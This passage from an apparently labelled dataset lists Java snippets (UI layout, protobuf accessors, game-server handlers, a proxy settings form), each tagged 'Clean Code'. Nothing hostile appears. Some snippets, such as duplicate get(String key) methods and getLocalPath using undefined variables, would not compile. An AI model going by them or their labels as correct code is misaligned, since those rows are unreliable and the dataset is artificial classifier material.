      final int n=mSize > (BASE_SIZE * 2) ? (mSize + (mSize >> 1)) : (BASE_SIZE * 2);
      if (DEBUG)       System.out.println(""remove: shrink from "" + mHashes.length + "" to ""+ n);
      final int[] ohashes=mHashes;
      final Object[] oarray=mArray;
      allocArrays(n);
      mSize--;
      if (index > 0) {
        if (DEBUG)         System.out.println(""remove: copy from 0-"" + index + "" to 0"");
        System.arraycopy(ohashes,0,mHashes,0,index);
        System.arraycopy(oarray,0,mArray,0,index << 1);
      }
      if (index < mSize) {
        if (DEBUG)         System.out.println(""remove: copy from "" + (index + 1) + ""-""+ mSize+ "" to ""+ index);
        System.arraycopy(ohashes,index + 1,mHashes,index,mSize - index);
        System.arraycopy(oarray,(index + 1) << 1,mArray,index << 1,(mSize - index) << 1);
      }
    }
 else {
      mSize--;
      if (index < mSize) {
        if (DEBUG)         System.out.println(""remove: move "" + (index + 1) + ""-""+ mSize+ "" to ""+ index);
        System.arraycopy(mHashes,index + 1,mHashes,index,mSize - index);
        System.arraycopy(mArray,(index + 1) << 1,mArray,index << 1,(mSize - index) << 1);
      }
      mArray[mSize << 1]=null;
      mArray[(mSize << 1) + 1]=null;
    }
  }
  return (V)old;
}",0,Clean Code
"@Override public boolean onGenericMotionEvent(MotionEvent event){
switch (event.getAction()) {
case MotionEvent.ACTION_SCROLL:
    final float axisValue;
  if (event.isFromSource(InputDevice.SOURCE_CLASS_POINTER)) {
    axisValue=event.getAxisValue(MotionEvent.AXIS_VSCROLL);
  }
 else   if (event.isFromSource(InputDevice.SOURCE_ROTARY_ENCODER)) {
    axisValue=event.getAxisValue(MotionEvent.AXIS_SCROLL);
  }
 else {
    axisValue=0;
  }
final int delta=Math.round(axisValue * mVerticalScrollFactor);
if (delta != 0) {
final int range=getScrollRange();
int oldScrollY=getScrollY();
int newScrollY=oldScrollY - delta;
if (newScrollY < 0) {
  newScrollY=0;
}
 else if (newScrollY > range) {
  newScrollY=range;
}
if (newScrollY != oldScrollY) {
  super.scrollTo(getScrollX(),newScrollY);
  return true;
}
}
break;
}
return super.onGenericMotionEvent(event);
}",0,Clean Code
"public static void startFBSMediaContent(FlatBufferBuilder builder){
  builder.startTable(2);
}",0,Clean Code
"public static SetHeroBasicTypeCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SetHeroBasicTypeCsReq(),data).checkInitialized();
}
public static SetHeroBasicTypeCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SetHeroBasicTypeCsReq(),input).checkInitialized();
}
public static SetHeroBasicTypeCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SetHeroBasicTypeCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * <code>repeated .DailyActivityInfo daily_active_level_list = 3;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<DailyActivityInfoOuterClass.DailyActivityInfo> getMutableDailyActiveLevelList(){
  bitField0_|=0x00000004;
  return dailyActiveLevelList;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  session.send(CmdId.GetAssistListScRsp);
}
",0,Clean Code
"private LineupInfo(){
}
",0,Clean Code
"public ArrayList<GProFeedSummary> getFeedSummaryList(){
  return this.feedSummaryList;
}
",0,Clean Code
"static MistralAiTool toMistralAiTool(ToolSpecification toolSpecification){
  MistralAiFunction function=MistralAiFunction.builder().name(toolSpecification.name()).description(toolSpecification.description()).parameters(toMistralAiParameters(toolSpecification.parameters())).build();
  return MistralAiTool.from(function);
}
",0,Clean Code
"/** 
 * Extract the type, variation and facing attributes of a blockstate and return them in a new DrawBlock object.<br>
 * @param state the IBlockState to be examined
 * @return A DrawBlock object
 */
public static DrawBlock getDrawBlockFromBlockState(IBlockState state,List<IProperty> extraProperties){
  if (state == null)   return null;
  DrawBlock block=new DrawBlock();
  Object blockName=Block.REGISTRY.getNameForObject(state.getBlock());
  if (blockName instanceof ResourceLocation) {
    String name=((ResourceLocation)blockName).getResourcePath();
    BlockType type=BlockType.fromValue(name);
    block.setType(type);
  }
  Colour col=null;
  Variation var=null;
  Facing face=null;
  for (  IProperty prop : state.getProperties().keySet()) {
    String propVal=state.getValue(prop).toString();
    boolean matched=false;
    if (col == null) {
      col=attemptToGetAsColour(propVal);
      if (col != null)       matched=true;
    }
    if (!matched && var == null) {
      var=attemptToGetAsVariant(propVal);
      if (var != null)       matched=true;
    }
    if (!matched && face == null) {
      face=attemptToGetAsFacing(propVal);
      if (face != null)       matched=true;
    }
    if (!matched) {
      if (extraProperties != null)       extraProperties.add(prop);
    }
  }
  if (col != null)   block.setColour(col);
  if (var != null)   block.setVariant(var);
  if (face != null)   block.setFace(face);
  return block;
}
",0,Clean Code
"@Override public void onItemClick(int id){
  if (id == -1) {
    finishFragment();
  }
 else   if (id == done_button) {
    if (getParentActivity() == null) {
      return;
    }
    if (StrUtil.isBlank(ipField.getText())) {
      ipField.requestFocus();
      AndroidUtilities.showKeyboard(ipField);
      return;
    }
    if (StrUtil.isBlank(portField.getText())) {
      portField.requestFocus();
      AndroidUtilities.showKeyboard(portField);
      return;
    }
    if (StrUtil.isBlank(passwordField.getText())) {
      passwordField.requestFocus();
      AndroidUtilities.showKeyboard(passwordField);
      return;
    }
    currentBean.setHost(ipField.getText().toString());
    currentBean.setRemotePort(Utilities.parseInt(portField.getText().toString()));
    currentBean.setPassword(passwordField.getText().toString());
    currentBean.setMethod(methodField.getValueTextView().getText().toString());
    currentBean.setProtocol(protocolField.getValueTextView().getText().toString());
    currentBean.setProtocol_param(protocolParamField.getText().toString());
    currentBean.setObfs(obfsField.getValueTextView().getText().toString());
    currentBean.setObfs_param(obfsParamField.getText().toString());
    currentBean.setRemarks(remarksField.getText().toString());
    if (currentProxyInfo == null) {
      currentProxyInfo=new SharedConfig.ShadowsocksRProxy(currentBean);
      SharedConfig.addProxy(currentProxyInfo);
      SharedConfig.setCurrentProxy(currentProxyInfo);
    }
 else {
      currentProxyInfo.proxyCheckPingId=0;
      currentProxyInfo.availableCheckTime=0;
      currentProxyInfo.ping=0;
      SharedConfig.saveProxyList();
      SharedConfig.setProxyEnable(false);
    }
    finishFragment();
  }
}",0,Clean Code
"/** 
 * Adds task logs
 * @param taskId Id of the task
 * @param log logs
 */
public void log(String taskId,String log){
  TaskExecLog executionLog=new TaskExecLog();
  executionLog.setTaskId(taskId);
  executionLog.setLog(log);
  executionLog.setCreatedTime(System.currentTimeMillis());
  executionDAOFacade.addTaskExecLog(Collections.singletonList(executionLog));
}
",0,Clean Code
"@Override public void mouseWheelMoved(final MouseWheelEvent e){
  final int notches=e.getWheelRotation();
  verticalScrollbar.setValue(verticalScrollbar.getValue() + notches);
}
",0,Clean Code
"@Override public RogueHandbookBuff create(){
  return RogueHandbookBuff.newInstance();
}
",0,Clean Code
"@Override protected void endDynamic(VmDynamic value,boolean isEmpty){
  if (value.hasElements()) {
    endArray(isEmpty);
  }
 else {
    endDict(isEmpty);
  }
}
",0,Clean Code
"@Override public int hashCode(){
  final int prime=31;
  int result=1;
  result=prime * result + ((name == null) ? 0 : name.hashCode());
  result=prime * result + ((description == null) ? 0 : description.hashCode());
  result=prime * result + ((inputType == null) ? 0 : inputType.hashCode());
  return result;
}",0,Clean Code
"/** 
 * <code>repeated string para_list = 1;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableParaList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedString getParaList(){
  return paraList;
}",0,Clean Code
"public PttDownExtraInfo(int i2,int i3){
  this.mFromType=i2;
  this.mLayer=i3;
}",0,Clean Code
"/** 
 * <code>optional uint64 create_time_ms = 11;</code>
 * @return the createTimeMs
 */
public long getCreateTimeMs(){
  return createTimeMs;
}",0,Clean Code
"@Override protected void onLayout(boolean changed,int l,int t,int r,int b){
  int width=r - l;
  int height=b - t;
  int y=0;
  if (currentType == TYPE_MRZ) {
    if (cameraView != null) {
      cameraView.layout(0,y,cameraView.getMeasuredWidth(),y + cameraView.getMeasuredHeight());
    }
    recognizedMrzView.setTextSize(TypedValue.COMPLEX_UNIT_PX,height / 22);
    recognizedMrzView.setPadding(0,0,0,height / 15);
    y=(int)(height * 0.65f);
    titleTextView.layout(dp(36),y,dp(36) + titleTextView.getMeasuredWidth(),y + titleTextView.getMeasuredHeight());
  }
 else {
    actionBar.layout(0,0,actionBar.getMeasuredWidth(),actionBar.getMeasuredHeight());
    if (cameraView != null) {
      cameraView.layout(0,0,cameraView.getMeasuredWidth(),cameraView.getMeasuredHeight());
    }
    int size=(int)(Math.min(width,height) / 1.5f);
    if (currentType == TYPE_QR) {
      y=(height - size) / 2 - titleTextView.getMeasuredHeight() - dp(30);
    }
 else {
      y=(height - size) / 2 - titleTextView.getMeasuredHeight() - dp(64);
    }
    titleTextView.layout(dp(36),y,dp(36) + titleTextView.getMeasuredWidth(),y + titleTextView.getMeasuredHeight());
    if (currentType == TYPE_QR_WEB_BOT) {
      y+=titleTextView.getMeasuredHeight() + dp(8);
      descriptionText.layout(dp(36),y,dp(36) + descriptionText.getMeasuredWidth(),y + descriptionText.getMeasuredHeight());
    }
    recognizedMrzView.layout(0,getMeasuredHeight() - recognizedMrzView.getMeasuredHeight(),getMeasuredWidth(),getMeasuredHeight());
    int x;
    if (needGalleryButton) {
      x=width / 2 + dp(35);
    }
 else {
      x=width / 2 - flashButton.getMeasuredWidth() / 2;
    }
    y=(height - size) / 2 + size + dp(80);
    flashButton.layout(x,y,x + flashButton.getMeasuredWidth(),y + flashButton.getMeasuredHeight());
    if (galleryButton != null) {
      x=width / 2 - dp(35) - galleryButton.getMeasuredWidth();
      galleryButton.layout(x,y,x + galleryButton.getMeasuredWidth(),y + galleryButton.getMeasuredHeight());
    }
  }
  if (currentType != TYPE_QR_WEB_BOT) {
    y=(int)(height * 0.74f);
    int x=(int)(width * 0.05f);
    descriptionText.layout(x,y,x + descriptionText.getMeasuredWidth(),y + descriptionText.getMeasuredHeight());
  }
  updateNormalBounds();
}",0,Clean Code
"/** 
 * <code>optional uint32 unk_int = 15;</code>
 * @param value the unkInt to set
 * @return this
 */
public RotaterData setUnkInt(final int value){
  bitField0_|=0x00000004;
  unkInt=value;
  return this;
}",0,Clean Code
"SwipeListenerHorizontal(Object cellLayout){
  helperContext=((ViewGroup)cellLayout).getContext();
  float density=helperContext.getResources().getDisplayMetrics().density;
  SWIPE_MIN_DISTANCE_HORIZ=Math.round(75 * density);
  SWIPE_THRESHOLD_VELOCITY=Math.round(33 * density);
}",0,Clean Code
"static float squareDistance(ArrayVectorFloat v1,ArrayVectorFloat v2){
  return squareDistance(v1,0,v2,0,v1.length());
}
static float squareDistance(ArrayVectorFloat v1,int v1offset,ArrayVectorFloat v2,int v2offset,final int length){
  if (length >= FloatVector.SPECIES_PREFERRED.length())   return squareDistancePreferred(v1,v1offset,v2,v2offset,length);
  if (length < FloatVector.SPECIES_128.length())   return squareDistance64(v1,v1offset,v2,v2offset,length);
 else   if (length < FloatVector.SPECIES_256.length())   return squareDistance128(v1,v1offset,v2,v2offset,length);
 else   return squareDistance256(v1,v1offset,v2,v2offset,length);
}",0,Clean Code
"/** 
 * <code>optional uint32 cur_site_id = 15;</code>
 * @return whether the curSiteId field is set
 */
public boolean hasCurSiteId(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var req=HandleFriendCsReq.parseFrom(data);
  session.getPlayer().getFriendList().handleFriendRequest(req.getUid(),req.getHandleResult());
}
",0,Clean Code
"private int getButtonType(ItemInfo info,View view){
  if (view instanceof AppWidgetHostView) {
    if (getReconfigurableWidgetId(view) != INVALID_APPWIDGET_ID) {
      return RECONFIGURE;
    }
    return INVALID;
  }
 else   if (info.isPredictedItem()) {
    return DISMISS_PREDICTION;
  }
  Boolean uninstallDisabled=mUninstallDisabledCache.get(info.user);
  if (uninstallDisabled == null) {
    UserManager userManager=(UserManager)getContext().getSystemService(Context.USER_SERVICE);
    Bundle restrictions=userManager.getUserRestrictions(info.user);
    uninstallDisabled=restrictions.getBoolean(UserManager.DISALLOW_APPS_CONTROL,false) || restrictions.getBoolean(UserManager.DISALLOW_UNINSTALL_APPS,false);
    mUninstallDisabledCache.put(info.user,uninstallDisabled);
  }
  mCacheExpireAlarm.setAlarm(CACHE_EXPIRE_TIMEOUT);
  mCacheExpireAlarm.setOnAlarmListener(this);
  if (uninstallDisabled) {
    return INVALID;
  }
  if (info instanceof ItemInfoWithIcon) {
    ItemInfoWithIcon iconInfo=(ItemInfoWithIcon)info;
    if ((iconInfo.runtimeStatusFlags & FLAG_SYSTEM_MASK) != 0 && (iconInfo.runtimeStatusFlags & FLAG_SYSTEM_NO) == 0) {
      return INVALID;
    }
  }
  if (getUninstallTarget(info) == null) {
    return INVALID;
  }
  return UNINSTALL;
}",0,Clean Code
"/** 
 * @param queueName Name of the queue
 * @return size of the queue
 */
int getSize(String queueName);
",0,Clean Code
"public static String getOperatorMethodName(String operatorName){
switch (operatorName) {
case OPERATOR_PLUS:
    return ""plus"";
case OPERATOR_MINUS:
  return ""minus"";
case OPERATOR_MUL:
return ""times"";
case OPERATOR_DIV:
return ""div"";
case OPERATOR_MOD:
return ""rem"";
case OPERATOR_LT:
return ""lt"";
case OPERATOR_LE:
return ""le"";
case OPERATOR_GT:
return ""gt"";
case OPERATOR_GE:
return ""ge"";
case OPERATOR_AND:
return ""and"";
case OPERATOR_OR:
return ""or"";
case OPERATOR_EQ:
return ""eq"";
}
return null;
}
",0,Clean Code
"@Override public Object getValueAt(int rowIndex,int columnIndex){
  ScanQueueTag.TablesData datas=this.Udatas.get(rowIndex);
switch (columnIndex) {
case 0:
    return datas.id;
case 1:
  return datas.extensionMethod;
case 2:
return datas.requestMethod;
case 3:
return datas.url;
case 4:
return datas.statusCode;
case 5:
return datas.issue;
case 6:
return datas.startTime;
case 7:
return datas.endTime;
}
return null;
}",0,Clean Code
"public SearchFileKeywordsResult(){
  this.resultItems=new ArrayList<>();
}
public SearchFileKeywordsResult(int i2,boolean z,ArrayList<SearchFileItem> arrayList){
  this.resultItems=new ArrayList<>();
  this.searchId=i2;
  this.hasMore=z;
  this.resultItems=arrayList;
}",0,Clean Code
"public String get(String key){
  return parent + ""."" + key+ ""}"";
}
public String get(String key,int index){
  return parent + ""."" + key+ ""[""+ index+ ""]}"";
}
public String get(int index){
  return parent + ""["" + index+ ""]}"";
}
public String get(String key){
  return ""${"" + name + "".""+ field+ "".""+ key+ ""}"";
}
",0,Clean Code
"public String toString(){
  return ""GProAnchorSetRoomInfoReq{roomId="" + this.roomId + "",attrs=""+ this.attrs+ "",programId=""+ this.programId+ "",tags=""+ this.tags+ "",source=""+ this.source+ "",machine=""+ this.machine+ "",}"";
}
",0,Clean Code
"@Override public CfCarParkReleaseLogExample getExampleByQuery(CfCarParkReleaseLogQuery cfCarParkReleaseLogQuery){
  CfCarParkReleaseLogExample cfCarParkReleaseLogExample=new CfCarParkReleaseLogExample();
  CfCarParkReleaseLogExample.Criteria criteria=cfCarParkReleaseLogExample.createCriteria();
  if (StringUtils.isNotEmpty(cfCarParkReleaseLogQuery.getCarparkId())) {
    criteria.andCarparkIdEqualTo(cfCarParkReleaseLogQuery.getCarparkId());
  }
  if (StringUtils.isNotEmpty(cfCarParkReleaseLogQuery.getCarparkUseLogId())) {
    criteria.andCarparkUseLogIdEqualTo(cfCarParkReleaseLogQuery.getCarparkUseLogId());
  }
  if (StringUtils.isNotEmpty(cfCarParkReleaseLogQuery.getUid())) {
    criteria.andUidEqualTo(cfCarParkReleaseLogQuery.getUid());
  }
  if (StringUtils.isNotEmpty(cfCarParkReleaseLogQuery.getDeviceSerialNumber())) {
    criteria.andDeviceSerialNumberEqualTo(cfCarParkReleaseLogQuery.getDeviceSerialNumber());
  }
  if (cfCarParkReleaseLogQuery.getStatus() != null) {
    criteria.andStatusEqualTo(cfCarParkReleaseLogQuery.getStatus());
  }
  if (cfCarParkReleaseLogQuery.getType() != null) {
    criteria.andTypeEqualTo(cfCarParkReleaseLogQuery.getType());
  }
  if (cfCarParkReleaseLogQuery.getMinApplicationTime() != null) {
    criteria.andApplicationTimeGreaterThanOrEqualTo(cfCarParkReleaseLogQuery.getMinApplicationTime());
  }
  if (cfCarParkReleaseLogQuery.getMaxApplicationTime() != null) {
    criteria.andApplicationTimeLessThanOrEqualTo(cfCarParkReleaseLogQuery.getMaxApplicationTime());
  }
  if (cfCarParkReleaseLogQuery.getMinExecutionTime() != null) {
    criteria.andExecutionTimeGreaterThanOrEqualTo(cfCarParkReleaseLogQuery.getMinExecutionTime());
  }
  if (cfCarParkReleaseLogQuery.getMaxExecutionTime() != null) {
    criteria.andExecutionTimeLessThanOrEqualTo(cfCarParkReleaseLogQuery.getMaxExecutionTime());
  }
  if (StringUtils.isNotEmpty(cfCarParkReleaseLogQuery.getOrderBy())) {
    cfCarParkReleaseLogExample.setOrderByClause(cfCarParkReleaseLogQuery.getOrderBy());
  }
  if (cfCarParkReleaseLogQuery.getPage() != null && cfCarParkReleaseLogQuery.getSize() != null) {
    PageHelper.startPage(cfCarParkReleaseLogQuery.getPage(),cfCarParkReleaseLogQuery.getSize());
  }
  return cfCarParkReleaseLogExample;
}
",0,Clean Code
"private @Nullable Path getLocalPath(Dependency dependency,PackageAssetUri packageAssetUri){
  if (!(dependency instanceof LocalDependency)) {
    return null;
  }
  return localDependency.resolveAssetPath(getProjectDepsResolver().getProjectDir(),packageAssetUri);
}
private @Nullable Path getLocalPath(Dependency dependency){
  if (!(dependency instanceof LocalDependency)) {
    return null;
  }
  return getLocalPath(dependency,packageAssetUri);
}
",0,Clean Code
"public String getFileUuid(){
  return this.fileUuid;
}
",0,Clean Code
"/** 
 * <code>repeated .SceneGroupRefreshInfo group_refresh_info = 14;</code>
 * @param values the groupRefreshInfo to add
 * @return this
 */
public SceneGroupRefreshScNotify addAllGroupRefreshInfo(final SceneGroupRefreshInfoOuterClass.SceneGroupRefreshInfo... values){
  bitField0_|=0x00000001;
  groupRefreshInfo.addAll(values);
  return this;
}",0,Clean Code
"private void fadeOutToLessWidth(int largerWidth){
  this.largerWidth=largerWidth;
  SimpleTextView titleTextLargerCopyView=this.titleTextLargerCopyView.get();
  if (titleTextLargerCopyView != null) {
    removeView(titleTextLargerCopyView);
  }
  titleTextLargerCopyView=new SimpleTextView(getContext());
  this.titleTextLargerCopyView.set(titleTextLargerCopyView);
  titleTextLargerCopyView.setTextColor(getThemedColor(Theme.key_actionBarDefaultTitle));
  titleTextLargerCopyView.setTextSize(18);
  titleTextLargerCopyView.setGravity(Gravity.LEFT);
  titleTextLargerCopyView.setTypeface(AndroidUtilities.getTypeface(""fonts/rmedium.ttf""));
  titleTextLargerCopyView.setLeftDrawableTopPadding(-AndroidUtilities.dp(1.3f));
  titleTextLargerCopyView.setRightDrawable(titleTextView.getRightDrawable());
  titleTextLargerCopyView.setRightDrawable2(titleTextView.getRightDrawable2());
  titleTextLargerCopyView.setRightDrawableOutside(titleTextView.getRightDrawableOutside());
  titleTextLargerCopyView.setLeftDrawable(titleTextView.getLeftDrawable());
  titleTextLargerCopyView.setText(titleTextView.getText());
  titleTextLargerCopyView.animate().alpha(0).setDuration(350).setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT).withEndAction(() -> {
    SimpleTextView titleTextLargerCopyView2=this.titleTextLargerCopyView.get();
    if (titleTextLargerCopyView2 != null) {
      removeView(titleTextLargerCopyView2);
      this.titleTextLargerCopyView.set(null);
    }
  }
).start();
  addView(titleTextLargerCopyView);
  SimpleTextView subtitleTextLargerCopyView=this.subtitleTextLargerCopyView.get();
  if (subtitleTextLargerCopyView != null) {
    removeView(subtitleTextLargerCopyView);
  }
  subtitleTextLargerCopyView=new SimpleTextView(getContext());
  this.subtitleTextLargerCopyView.set(subtitleTextLargerCopyView);
  subtitleTextLargerCopyView.setTextColor(getThemedColor(Theme.key_actionBarDefaultSubtitle));
  subtitleTextLargerCopyView.setTag(Theme.key_actionBarDefaultSubtitle);
  subtitleTextLargerCopyView.setTextSize(14);
  subtitleTextLargerCopyView.setGravity(Gravity.LEFT);
  if (subtitleTextView != null) {
    subtitleTextLargerCopyView.setText(subtitleTextView.getText());
  }
 else   if (animatedSubtitleTextView != null) {
    subtitleTextLargerCopyView.setText(animatedSubtitleTextView.getText());
  }
  subtitleTextLargerCopyView.animate().alpha(0).setDuration(350).setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT).withEndAction(() -> {
    SimpleTextView subtitleTextLargerCopyView2=this.subtitleTextLargerCopyView.get();
    if (subtitleTextLargerCopyView2 != null) {
      removeView(subtitleTextLargerCopyView2);
      this.subtitleTextLargerCopyView.set(null);
      if (!allowDrawStories) {
        setClipChildren(true);
      }
    }
  }
).start();
  addView(subtitleTextLargerCopyView);
  setClipChildren(false);
}",0,Clean Code
"private void assertServices(Collection<ExampleService> services){
  assertThat(services).extracting(ExampleService::getGreeting).containsExactlyInAnyOrder(""Hello"",""Goodbye"");
}
",0,Clean Code
"@Override public void onClick(DialogInterface dialog,int which){
  setAppState(act,mPackageInfo.packageName,item,false);
}
",0,Clean Code
"@Override public RogueAvatarInfo create(){
  return RogueAvatarInfo.newInstance();
}
",0,Clean Code
"@Override public int compare(AvatarExpItemExcel o1,AvatarExpItemExcel o2){
  return o2.getExp() - o1.getExp();
}",0,Clean Code
"@Override public GetSceneMapInfoScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  entryId=0;
  curMapEntryId=0;
  unlockedTeleportList.clear();
  lightenSectionList.clear();
  mapList.clear();
  mazePropList.clear();
  mazeGroupList.clear();
  unlockedChestList.clear();
  return this;
}",0,Clean Code
"public JavaType type(@Nullable com.sun.tools.javac.code.Type type){
  if (type == null || type instanceof Type.ErrorType || type instanceof Type.PackageType || type instanceof Type.UnknownType || type instanceof NullType) {
    return JavaType.Class.Unknown.getInstance();
  }
  String signature=signatureBuilder.signature(type);
  JavaType existing=typeCache.get(signature);
  if (existing != null) {
    return existing;
  }
  if (type instanceof Type.IntersectionClassType) {
    return intersectionType((Type.IntersectionClassType)type,signature);
  }
 else   if (type instanceof Type.ClassType) {
    return classType((Type.ClassType)type,signature);
  }
 else   if (type instanceof Type.TypeVar) {
    return generic((Type.TypeVar)type,signature);
  }
 else   if (type instanceof Type.JCPrimitiveType) {
    return primitive(type.getTag());
  }
 else   if (type instanceof Type.JCVoidType) {
    return JavaType.Primitive.Void;
  }
 else   if (type instanceof Type.ArrayType) {
    return array(type,signature);
  }
 else   if (type instanceof Type.WildcardType) {
    return generic((Type.WildcardType)type,signature);
  }
 else   if (type instanceof Type.AnnotatedType) {
    return type(type.unannotatedType());
  }
 else   if (type instanceof Type.JCNoType) {
    return JavaType.Class.Unknown.getInstance();
  }
  throw new UnsupportedOperationException(""Unknown type "" + type.getClass().getName());
}
@SuppressWarnings(""ConstantConditions"") public JavaType type(@Nullable Tree tree){
  if (tree == null) {
    return null;
  }
  Symbol symbol=null;
  if (tree instanceof JCTree.JCIdent) {
    symbol=((JCTree.JCIdent)tree).sym;
  }
 else   if (tree instanceof JCTree.JCMethodDecl) {
    symbol=((JCTree.JCMethodDecl)tree).sym;
  }
 else   if (tree instanceof JCTree.JCVariableDecl) {
    return variableType(((JCTree.JCVariableDecl)tree).sym);
  }
 else   if (tree instanceof JCTree.JCAnnotatedType && ((JCTree.JCAnnotatedType)tree).getUnderlyingType() instanceof JCTree.JCArrayTypeTree) {
    return annotatedArray((JCTree.JCAnnotatedType)tree);
  }
  return type(((JCTree)tree).type,symbol);
}
@Nullable private JavaType type(Type type,Symbol symbol){
  if (type instanceof Type.MethodType) {
    return methodInvocationType(type,symbol);
  }
  return type(type);
}
",0,Clean Code
"@NonNull public static <T extends QRouteApi>T api(Class<T> cls){
  return null;
}
",0,Clean Code
"public String getSummary(){
  return this.summary;
}
",0,Clean Code
